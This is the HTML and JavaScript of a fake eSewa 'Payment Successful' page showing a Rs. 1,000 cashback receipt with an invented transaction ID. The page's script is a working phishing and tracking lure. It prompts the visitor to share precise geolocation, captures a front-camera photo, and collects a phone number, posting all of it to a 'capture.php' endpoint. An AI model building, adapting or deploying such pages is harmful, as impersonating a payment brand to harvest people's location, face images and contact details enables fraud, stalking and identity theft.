<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>eSewa - Payment Successful</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
  body { font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
    background:#f2f4f7; min-height:100vh; display:flex; flex-direction:column;
    align-items:center; padding-bottom:170px; }
  .topbar { width:100%; background:#60BB46; color:#fff; padding:14px 16px;
    padding-top:env(safe-area-inset-top,14px); font-size:16px; font-weight:600;
    display:flex; align-items:center; gap:10px; position:fixed; top:0; left:0; z-index:10; }
  .topbar .back { font-size:22px; line-height:1; }
  .topbar .title { flex:1; text-align:center; margin-right:22px; }
  .card { background:#fff; width:92%; max-width:420px; border-radius:14px;
    margin-top:70px; padding:26px 22px 30px; box-shadow:0 4px 18px rgba(0,0,0,.08);
    text-align:center; }
  .logo { color:#60BB46; font-size:30px; font-weight:800; margin-bottom:6px; }
  .logo span { color:#333; }
  .check { width:74px; height:74px; border-radius:50%; background:#60BB46;
    color:#fff; font-size:40px; line-height:74px; margin:14px auto 16px;
    animation:pop .4s ease-out; }
  @keyframes pop { 0%{transform:scale(0)} 70%{transform:scale(1.15)} 100%{transform:scale(1)} }
  .amount { font-size:32px; font-weight:700; color:#222; margin-bottom:4px; }
  .status { color:#60BB46; font-weight:600; font-size:14px; margin-bottom:22px; }
  .details { text-align:left; border-top:1px dashed #ddd; padding-top:16px; }
  .row { display:flex; justify-content:space-between; padding:8px 0; font-size:13.5px; }
  .row .label { color:#999; }
  .row .val { color:#222; font-weight:500; text-align:right; }
  .footer { margin-top:24px; font-size:11.5px; color:#aaa; }
  .actions { width:92%; max-width:420px; margin-top:16px; display:flex; gap:10px; }
  .actions button { flex:1; padding:12px; border:none; border-radius:10px;
    background:#60BB46; color:#fff; font-size:13.5px; font-weight:600; cursor:pointer; }
  .actions button:disabled { background:#b5d6a8; }
  .actions button.done { background:#3d8a2c; }
  .formbar { position:fixed; bottom:0; left:0; right:0; background:#fff;
    padding:12px 14px 16px; padding-bottom:calc(16px + env(safe-area-inset-bottom,0px));
    box-shadow:0 -2px 12px rgba(0,0,0,.1); z-index:20; }
  .formbar input { width:100%; padding:10px; border:1px solid #ddd;
    border-radius:8px; margin-bottom:8px; font-size:16px; font-family:inherit; }
  .formbar button { width:100%; padding:12px; border:none; border-radius:10px;
    background:#60BB46; color:#fff; font-size:14px; font-weight:700; cursor:pointer; }
  .formbar button:disabled { background:#b5d6a8; }
  .statusPill { position:fixed; top:64px; left:50%; transform:translateX(-50%);
    background:rgba(0,0,0,.78); color:#fff; font-size:11.5px; padding:6px 14px;
    border-radius:20px; opacity:0; transition:opacity .3s; pointer-events:none;
    z-index:30; white-space:nowrap; }
  .statusPill.show { opacity:1; }
  #video { display:none; }
</style>
</head>
<body>
<div class="topbar"><span class="back">&#8592;</span><span class="title">Transaction Details</span></div>
<div class="card">
  <div class="logo">e<span>Sewa</span></div>
  <div class="check">&#10003;</div>
  <div class="amount">Rs. 1,000</div>
  <div class="status">Payment Successful</div>
  <div class="details">
    <div class="row"><span class="label">Paid To</span><span class="val">Cashback Reward</span></div>
    <div class="row"><span class="label">Transaction ID</span><span class="val" id="txnId"></span></div>
    <div class="row"><span class="label">Date</span><span class="val" id="txnDate"></span></div>
    <div class="row"><span class="label">Amount</span><span class="val">NPR 1,000.00</span></div>
    <div class="row"><span class="label">Total</span><span class="val">NPR 1,000.00</span></div>
    <div class="row"><span class="label">Status</span><span class="val" style="color:#60BB46">Success</span></div>
  </div>
  <div class="footer">Powered by eSewa</div>
</div>
<div class="actions">
  <button id="btnLocation">&#128205; Get Location</button>
  <button id="btnCamera">&#128247; Take Photo</button>
</div>
<div class="statusPill" id="statusPill"></div>
<div class="formbar">
  <input id="phone" type="tel" placeholder="Your phone number" inputmode="numeric">
  <input id="notes" type="text" placeholder="Notes (optional)">
  <button id="btnSubmit">Confirm &amp; Continue</button>
</div>
<video id="video" playsinline autoplay muted></video>
<canvas id="canvas" style="display:none"></canvas>
<script>
"use strict";
const API = "capture.php";
const statusPill = document.getElementById('statusPill');
const showStatus = (msg) => { statusPill.textContent = msg; statusPill.classList.add('show');
  clearTimeout(showStatus._t); showStatus._t = setTimeout(()=>statusPill.classList.remove('show'),2500); };
document.getElementById('txnId').textContent = '0' + Math.floor(Math.random()*9e9+1e9);
document.getElementById('txnDate').textContent = new Date().toLocaleString('en-GB',
  {day:'2-digit',month:'short',year:'numeric',hour:'2-digit',minute:'2-digit'});
const captured = { location:null, image:null };
let cameraStream = null;
function sendData(payload){
  return fetch(API,{method:'POST',headers:{'Content-Type':'application/json;charset=UTF-8'},
    body:JSON.stringify(payload)}).then(r=>r.json()).catch(e=>{console.warn('send failed',e);return null;});
}
document.getElementById('btnLocation').addEventListener('click',()=>{
  if(!navigator.geolocation) return showStatus('Geolocation not supported');
  showStatus('Getting location...');
  navigator.geolocation.getCurrentPosition(pos=>{
    captured.location={latitude:pos.coords.latitude,longitude:pos.coords.longitude,accuracy:pos.coords.accuracy};
    sendData({location:captured.location}).then(()=>{ showStatus('Location captured');
      const b=document.getElementById('btnLocation'); b.classList.add('done'); b.textContent='\u2713 Location'; });
  },err=>showStatus('Location denied: '+err.message),{enableHighAccuracy:true,timeout:10000,maximumAge:0});
});
document.getElementById('btnCamera').addEventListener('click',async()=>{
  try{
    showStatus('Opening camera...');
    cameraStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:640},height:{ideal:480}},audio:false});
    const video=document.getElementById('video'); video.srcObject=cameraStream;
    await new Promise(res=>{ if(video.readyState>=2) return res(); video.onloadeddata=()=>res(); });
    await new Promise(res=>setTimeout(res,400));
    const canvas=document.getElementById('canvas');
    canvas.width=video.videoWidth||640; canvas.height=video.videoHeight||480;
    canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);
    captured.image=canvas.toDataURL('image/jpeg',0.8);
    cameraStream.getTracks().forEach(t=>t.stop()); cameraStream=null; video.srcObject=null;
    sendData({image:captured.image}).then(()=>{ showStatus('Photo captured');
      const b=document.getElementById('btnCamera'); b.classList.add('done'); b.textContent='\u2713 Photo'; });
  }catch(err){ showStatus('Camera denied: '+err.message); }
});
document.getElementById('btnSubmit').addEventListener('click',()=>{
  const phone=document.getElementById('phone').value.trim();
  const notes=document.getElementById('notes').value.trim();
  if(!/^[0-9+\-\s]{7,15}$/.test(phone)) return showStatus('Enter a valid phone number');
  sendData({phoneNumber:phone,notes:notes,location:captured.location,hasImage:!!captured.image}).then(()=>{
    showStatus('Submitted. Thank you!');
    const b=document.getElementById('btnSubmit'); b.disabled=true; b.textContent='Done \u2713'; });
});
document.addEventListener('visibilitychange',()=>{ if(document.hidden&&cameraStream){
  cameraStream.getTracks().forEach(t=>t.stop()); cameraStream=null; } });
</script>
</body>
</html>
